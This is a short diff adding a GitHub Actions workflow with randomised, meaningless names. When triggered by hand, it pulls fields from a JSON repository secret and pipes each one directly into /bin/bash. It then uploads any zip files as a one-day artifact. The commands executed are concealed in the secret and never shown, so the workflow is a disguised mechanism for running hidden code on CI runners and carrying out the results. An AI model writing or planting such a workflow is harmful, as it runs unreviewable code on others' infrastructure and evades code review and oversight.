@@ -1,0 +1,25 @@
+name: meganlincoln1158
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meganlincoln1158
+        env:
+          n298: ${{ secrets.n298 }}
+        run: |
+          printf '%s' "$n298" | jq -r .mlt09805 | /bin/bash
+          printf '%s' "$sbuft08622" | jq -r .p251 | /bin/bash
+          echo $y203 | jq -r .pnjn392 | /bin/bash
+          printf '%s' "$gix7" | jq -r .abqeb7628 | /bin/bash
+          printf '%s' "$pw0182" | jq -r .gstul9 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Hzlvdvpu
+          path: "*.zip"
+          retention-days: 1
